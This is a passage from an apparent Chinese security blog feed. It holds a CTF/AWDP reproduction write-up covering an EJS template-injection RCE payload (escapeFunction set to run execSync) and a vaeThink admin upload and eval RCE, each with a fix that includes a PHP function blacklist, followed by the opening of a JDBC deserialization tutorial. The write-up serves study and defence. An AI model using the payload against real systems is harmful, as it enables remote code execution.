punctuation">.</span>cache <span class="token operator">=</span> opts<span class="token punctuation">.</span>cache <span class="token operator">||</span> <span class="token boolean">false</span><span class="token punctuation">;</span>options<span class="token punctuation">.</span>rmWhitespace <span class="token operator">=</span> opts<span class="token punctuation">.</span>rmWhitespace<span class="token punctuation">;</span>options<span class="token punctuation">.</span>root <span class="token operator">=</span> opts<span class="token punctuation">.</span>root<span class="token punctuation">;</span>options<span class="token punctuation">.</span>includer <span class="token operator">=</span> opts<span class="token punctuation">.</span>includer<span class="token punctuation">;</span>options<span class="token punctuation">.</span>outputFunctionName <span class="token operator">=</span> opts<span class="token punctuation">.</span>outputFunctionName<span class="token punctuation">;</span>options<span class="token punctuation">.</span>localsName <span class="token operator">=</span> opts<span class="token punctuation">.</span>localsName <span class="token operator">||</span> exports<span class="token punctuation">.</span>localsName <span class="token operator">||</span> _DEFAULT_LOCALS_NAME<span class="token punctuation">;</span>options<span class="token punctuation">.</span>views <span class="token operator">=</span> opts<span class="token punctuation">.</span>views<span class="token punctuation">;</span>options<span class="token punctuation">.</span>async <span class="token operator">=</span> opts<span class="token punctuation">.</span>async<span class="token punctuation">;</span>options<span class="token punctuation">.</span>destructuredLocals <span class="token operator">=</span> opts<span class="token punctuation">.</span>destructuredLocals<span class="token punctuation">;</span>options<span class="token punctuation">.</span>legacyInclude <span class="token operator">=</span> <span class="token keyword">typeof</span> opts<span class="token punctuation">.</span>legacyInclude <span class="token operator">!=</span> <span class="token string">'undefined'</span> <span class="token operator">?</span> <span class="token operator">!</span><span class="token operator">!</span>opts<span class="token punctuation">.</span>legacyInclude <span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下断点测一下options的几个对象，发现这里<code>escapeFunction</code>被拼进了代码没被过滤</p><p><img src="/blog/2024/05/23/2024%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%86%B3%E8%B5%9B-%E5%A4%8D%E7%8E%B0/image-20240627170901265.png" alt="image-20240627170901265"></p><p>（这个escapeFn的定义是<code>var escapeFn = opts.escapeFunction;</code>，作用呢就是用户输入的html字符进行转义）</p><p>那么，控制这个地方就可以做到rce了，由于是对用户输入做转义，所以是对输入内容进行处理后返回，这个函数的返回值就直接是渲染上去的回显，也就是可以直接回显</p><p><img src="/blog/2024/05/23/2024%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%86%B3%E8%B5%9B-%E5%A4%8D%E7%8E%B0/image-20240627172501346.png" alt="image-20240627172501346"></p><p>payload：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">/</span>home<span class="token operator">?</span>page<span class="token operator">=</span>a<span class="token operator">&amp;</span>settings<span class="token punctuation">[</span>view<span class="token operator">%</span>20options<span class="token punctuation">]</span><span class="token punctuation">[</span>client<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>settings<span class="token punctuation">[</span>view<span class="token operator">%</span>20options<span class="token punctuation">]</span><span class="token punctuation">[</span>escape<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">.</span>constructor<span class="token punctuation">.</span><span class="token function">constructor</span><span class="token punctuation">(</span><span class="token string">"return%20process.mainModule.require('child_process').execSync('calc')"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/05/23/2024%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%86%B3%E8%B5%9B-%E5%A4%8D%E7%8E%B0/image-20240627164423112.png" alt="image-20240627164423112"></p><hr><h2 id="Fix"><a href="#Fix" class="headerlink" title="Fix"></a>Fix</h2><p>写中间件waf，直接白名单过滤</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">wafFilter</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> filteredParams <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> allowedParams <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 允许的参数名列表</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> param <span class="token keyword">in</span> req<span class="token punctuation">.</span>query<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>allowedParams<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      filteredParams<span class="token punctuation">[</span>param<span class="token punctuation">]</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">[</span>param<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  req<span class="token punctuation">.</span>filteredParams <span class="token operator">=</span> filteredParams<span class="token punctuation">;</span>  <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'/home'</span><span class="token punctuation">,</span> wafFilter<span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/home'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'home'</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>filteredParams<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'/about'</span><span class="token punctuation">,</span> wafFilter<span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/about'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'about'</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>filteredParams<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="bocaitar"><a href="#bocaitar" class="headerlink" title="bocaitar"></a>bocaitar</h1><blockquote><p>vaeThink</p></blockquote><p>最近太忙了，没空复现</p><p>给了个vaeThink框架，是tp5，感觉有说法</p><p>本地起一下环境，php用7.3.4，参考官方文档：<a href="http://tplay.pengyichen.cn/doc/">http://tplay.pengyichen.cn/doc/</a></p><p>网站根目录设在html文件夹下，然后把 data 文件夹下的 install.lock 删掉，这样就能安装了</p><p><img src="/blog/2024/05/23/2024%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%86%B3%E8%B5%9B-%E5%A4%8D%E7%8E%B0/image-20240612012019765.png" alt="image-20240612012019765"></p><p>注意这里还要修改一下.htaccess（明明是题目的附件却少这少那，存疑）</p><pre class="line-numbers language-htaccess" data-language="htaccess"><code class="language-htaccess">&lt;IfModule mod_rewrite.c&gt;Options +FollowSymlinks -MultiviewsRewriteEngine onRewriteCond %&#123;REQUEST_FILENAME&#125; !-dRewriteCond %&#123;REQUEST_FILENAME&#125; !-fRewriteRule ^(.*)$ index.php [L,E&#x3D;PATH_INFO:$1]&lt;&#x2F;IfModule&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>后面又弄了个tp报错界面出来得知是tp5.0.24，但是翻了下源码没找到能利用的反序列化入口</p><p>然后就能开始挖了</p><h2 id="Attack——后台文件上传"><a href="#Attack——后台文件上传" class="headerlink" title="Attack——后台文件上传"></a>Attack——后台文件上传</h2><p>参考：<a href="https://www.freebuf.com/vuls/203562.html">https://www.freebuf.com/vuls/203562.html</a></p><p>登录后台之后，发现</p><p>一样是前端校验后缀</p><p><img src="/blog/2024/05/23/2024%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%86%B3%E8%B5%9B-%E5%A4%8D%E7%8E%B0/image-20240612020044511.png" alt="image-20240612020044511"></p><p>于是成功上传</p><p>但是本地起的环境发现一个很逆天的地方，上传的public文件夹位置在上级目录导致根本访问不到，这源码疑似有点问题。。当然如果是故意的当我没说（不过没拿到管理员账密应该也打不了）</p><h2 id="Fix-1"><a href="#Fix-1" class="headerlink" title="Fix"></a>Fix</h2><p>漏洞点在这里</p><p><img src="/blog/2024/05/23/2024%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%86%B3%E8%B5%9B-%E5%A4%8D%E7%8E%B0/image-20240613011224881.png" alt="image-20240613011224881"></p><p>然后下断点调试一下</p><p><img src="/blog/2024/05/23/2024%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%86%B3%E8%B5%9B-%E5%A4%8D%E7%8E%B0/image-20240613011914635.png" alt="image-20240613011914635"></p><p>调试时注意到走到这一步的时候上传的文件仍然是临时文件</p><p><img src="/blog/2024/05/23/2024%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%86%B3%E8%B5%9B-%E5%A4%8D%E7%8E%B0/image-20240613012117848.png" alt="image-20240613012117848"></p><p>但是接下来就会变成保存的文件名</p><p>那么过滤的方法就有了，只需要在这一步检测<code>saveName</code>的后缀即可</p><p>因为<code>saveName</code>是一个 protected 变量，所以需要用<code>getSaveName</code>方法获取它的值，然后用<code>pathinfo</code>获取后缀名</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$pathInfo</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token operator">-></span><span class="token function">getSaveName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最终的修改结果为</p><p><img src="/blog/2024/05/23/2024%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%86%B3%E8%B5%9B-%E5%A4%8D%E7%8E%B0/image-20240613013117831.png" alt="image-20240613013117831"></p><p><img src="/blog/2024/05/23/2024%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%86%B3%E8%B5%9B-%E5%A4%8D%E7%8E%B0/image-20240613013243790.png" alt="image-20240613013243790"></p><hr><h2 id="Attack——后台RCE"><a href="#Attack——后台RCE" class="headerlink" title="Attack——后台RCE"></a>Attack——后台RCE</h2><p>搜一下<code>eval</code>，在 listenrain&#x2F;vae&#x2F;lib&#x2F;Auth.php 的<code>getAuthList</code>方法里有个疑似可以利用的点</p><p><img src="/blog/2024/05/23/2024%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%86%B3%E8%B5%9B-%E5%A4%8D%E7%8E%B0/image-20240613004813455.png" alt="image-20240613004813455"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/** * 获得权限列表 * @param integer $uid 用户id * @param integer $type * @return array */</span><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">getAuthList</span><span class="token punctuation">(</span><span class="token variable">$uid</span><span class="token punctuation">,</span> <span class="token variable">$type</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token variable">$_authList</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//保存用户验证通过的权限列表</span>    <span class="token variable">$t</span> <span class="token operator">=</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">','</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword type-casting">array</span><span class="token punctuation">)</span><span class="token variable">$type</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_authList</span><span class="token punctuation">[</span><span class="token variable">$uid</span> <span class="token operator">.</span> <span class="token variable">$t</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$_authList</span><span class="token punctuation">[</span><span class="token variable">$uid</span> <span class="token operator">.</span> <span class="token variable">$t</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">==</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'auth_type'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token class-name static-context">Session</span><span class="token operator">::</span><span class="token function">has</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'_auth_list_'</span> <span class="token operator">.</span> <span class="token variable">$uid</span> <span class="token operator">.</span> <span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name static-context">Session</span><span class="token operator">::</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'_auth_list_'</span> <span class="token operator">.</span> <span class="token variable">$uid</span> <span class="token operator">.</span> <span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//读取用户所属用户组</span>    <span class="token variable">$groups</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getGroups</span><span class="token punctuation">(</span><span class="token variable">$uid</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$ids</span>    <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//保存用户所属用户组设置的所有权限规则id</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$groups</span> <span class="token keyword">as</span> <span class="token variable">$g</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$ids</span> <span class="token operator">=</span> <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$ids</span><span class="token punctuation">,</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">','</span><span class="token punctuation">,</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$g</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'rules'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">','</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$ids</span> <span class="token operator">=</span> <span class="token function">array_unique</span><span class="token punctuation">(</span><span class="token variable">$ids</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$ids</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$_authList</span><span class="token punctuation">[</span><span class="token variable">$uid</span> <span class="token operator">.</span> <span class="token variable">$t</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$map</span> <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token string single-quoted-string">'id'</span>   <span class="token operator">=></span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'in'</span><span class="token punctuation">,</span> <span class="token variable">$ids</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'type'</span> <span class="token operator">=></span> <span class="token variable">$type</span>    <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//读取用户组所有权限规则</span>    <span class="token variable">$rules</span> <span class="token operator">=</span> <span class="token class-name static-context">Db</span><span class="token operator">::</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'auth_rule'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token variable">$map</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">field</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'condition,name'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">select</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//循环规则，判断结果。</span>    <span class="token variable">$authList</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$rules</span> <span class="token keyword">as</span> <span class="token variable">$rule</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$rule</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'condition'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//根据condition进行验证</span>            <span class="token variable">$user</span>    <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getUserInfo</span><span class="token punctuation">(</span><span class="token variable">$uid</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//获取用户信息,一维数组</span>            <span class="token variable">$command</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\&#123;(\w*?)\&#125;/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'$user[\'\\1\']'</span><span class="token punctuation">,</span> <span class="token variable">$rule</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'condition'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            @<span class="token punctuation">(</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'$condition=('</span> <span class="token operator">.</span> <span class="token variable">$command</span> <span class="token operator">.</span> <span class="token string single-quoted-string">');'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$condition</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$authList</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$rule</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//只要存在就记录</span>            <span class="token variable">$authList</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$rule</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$_authList</span><span class="token punctuation">[</span><span class="token variable">$uid</span> <span class="token operator">.</span> <span class="token variable">$t</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$authList</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">==</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'auth_type'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//规则列表结果保存到session</span>        <span class="token class-name static-context">Session</span><span class="token operator">::</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'_auth_list_'</span> <span class="token operator">.</span> <span class="token variable">$uid</span> <span class="token operator">.</span> <span class="token variable">$t</span><span class="token punctuation">,</span> <span class="token variable">$authList</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token function">array_unique</span><span class="token punctuation">(</span><span class="token variable">$authList</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>稍微跟进一下变量，可以发现这里的<code>$command</code>是由id查询得到的</p><p><img src="/blog/2024/05/23/2024%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%86%B3%E8%B5%9B-%E5%A4%8D%E7%8E%B0/image-20240613005240184.png" alt="image-20240613005240184"></p><p>现在往前跟进方法，在<code>check</code>函数中调用了<code>getAuthList</code></p><p><img src="/blog/2024/05/23/2024%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%86%B3%E8%B5%9B-%E5%A4%8D%E7%8E%B0/image-20240613005529650.png" alt="image-20240613005529650"></p><p>向前跟进到<code>AdminCheckAuth::run</code></p><p><img src="/blog/2024/05/23/2024%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%86%B3%E8%B5%9B-%E5%A4%8D%E7%8E%B0/image-20240613005746737.png" alt="image-20240613005746737"></p><p>到这里可以确定在管理员访问鉴权功能模块中会触发此流程</p><p>下断点动调</p><p>分析后可以确定，数据库中用户拥有的权限对应的规则的<code>condition</code>字段将会作为<code>eval()</code>的参数被执行</p><p><img src="/blog/2024/05/23/2024%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%86%B3%E8%B5%9B-%E5%A4%8D%E7%8E%B0/image-20240613010644926.png" alt="image-20240613010644926"></p><p>那就和参考文章一样的方法打进去即可</p><h2 id="Fix-2"><a href="#Fix-2" class="headerlink" title="Fix"></a>Fix</h2><p>直接对<code>$command</code>再套一层检测即可</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">   <span class="token variable">$command</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\&#123;(\w*?)\&#125;/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'$user[\'\\1\']'</span><span class="token punctuation">,</span> <span class="token variable">$rule</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'condition'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'exec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'shell_exec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'passthru'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'eval'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$item</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$command</span><span class="token punctuation">,</span> <span class="token variable">$item</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span>   @<span class="token punctuation">(</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'$condition=('</span> <span class="token operator">.</span> <span class="token variable">$command</span> <span class="token operator">.</span> <span class="token string single-quoted-string">');'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;我连线下赛都没进，但是后辈们进了，于是叫他们带了附件回来，因为有AWDP还是值得一看的&lt;/p&gt;</summary>
    
    
    
    <category term="AWDP" scheme="http://c1oudfl0w0.github.io/blog/categories/AWDP/"/>
    
    
    <category term="CMS" scheme="http://c1oudfl0w0.github.io/blog/tags/CMS/"/>
    
    <category term="Nodejs" scheme="http://c1oudfl0w0.github.io/blog/tags/Nodejs/"/>
    
  </entry>
  
  <entry>
    <title>JDBC反序列化</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/05/21/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/05/21/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-05-20T16:34:43.000Z</published>
    <updated>2024-06-04T16:07:27.055Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我从来都不觉得学java开心过x</p><p>参考：</p><p><a href="https://boogipop.com/2023/03/11/WebDog%E5%BF%85%E5%AD%A6%E7%9A%84JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://boogipop.com/2023/03/11/WebDog%E5%BF%85%E5%AD%A6%E7%9A%84JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></p><p><a href="https://boogipop.com/2023/10/01/JDBC-Attack%20%E5%88%A9%E7%94%A8%E6%B1%87%E6%80%BB/">https://boogipop.com/2023/10/01/JDBC-Attack%20%E5%88%A9%E7%94%A8%E6%B1%87%E6%80%BB/</a></p><p><a href="https://tttang.com/archive/1877/">https://tttang.com/archive/1877/</a></p><p><a href="https://xz.aliyun.com/t/8159">https://xz.aliyun.com/t/8159</a></p><p><a href="https://www.cnblogs.com/GeekerJun/p/17859798.html">https://www.cnblogs.com/GeekerJun/p/17859798.html</a></p><span id="more"></span><hr><h1 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h1><p>JDBC（Java DataBase Connectivity）是一种用于执行Sql语句的Java  Api，即Java数据库连接，是Java语言中用来规范客户端程序如何来访问数据库的应用程序接口，可以为多种关系数据库提供统一访问，提供了诸如查询和更新数据库中数据的方法，是Java访问数据库的标准规范。</p><p>简单理解为链接数据库、对数据库操作都需要通过jdbc来实现。</p><h2 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h2><p>想了想顺带把IDEA的基础使用也过一遍</p><p>IDEA新建一个普通项目即可，在src文件夹下新建一个软件包com.example</p><p>写一个Test类：</p><p>输入快捷命令<code>psvm</code>后回车，或者按<code>Tab键</code>快速自动生成<code>main函数结构体</code></p><p>然后在<code>main</code>中输入快捷命令<code>sout</code>后回车，或者按<code>Tab键</code>快速建立输出命名</p><p><img src="/blog/2024/05/21/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240521005703824.png" alt="image-20240521005703824"></p><p>接下来正式配置JDBC，驱动jar包的下载地址：<a href="https://dev.mysql.com/downloads/connector/j/">https://dev.mysql.com/downloads/connector/j/</a></p><p>这里先整一个8.0.12版本的jar包</p><p><img src="/blog/2024/05/21/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240521010043116.png" 